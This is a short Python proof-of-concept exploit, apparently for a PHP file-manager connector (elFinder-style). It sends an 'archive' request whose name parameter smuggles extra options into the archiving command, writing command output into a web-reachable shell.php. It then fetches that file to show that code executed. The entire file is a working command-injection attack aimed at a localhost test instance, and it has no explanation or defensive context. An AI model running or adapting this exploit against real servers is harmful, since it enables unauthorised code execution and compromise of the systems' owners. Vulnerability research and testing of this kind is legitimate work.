from requests import *

request_session = Session()

attack_url = "http://localhost:8080/php/connector.minimal.php?cmd=archive&name=-TvTT=id>shell.php%20%23%20a.zip&target=l1_Lw&targets%5B1%5D=l1_Mi56aXA&targets%5B0%5D=l1_MS50eHQ&type=application%2Fzip"
shell_url = "http://localhost:8080/files/shell.php"
headers ={
    "Host" : "your-ip",
    "Accept" : "application/json, text/javascript, */*; q=0.01",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
    "X-Requested-With": "XMLHttpRequest",
    "Referer": "http://localhost:8080/",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
    "Connection": "close"
}

response = request_session.get(attack_url, headers=headers)

if response.status_code == 200:
    response = request_session.get(shell_url)
    print(response.text, end="")
else:
    print(f"Request failed with status code {response.status_code}")
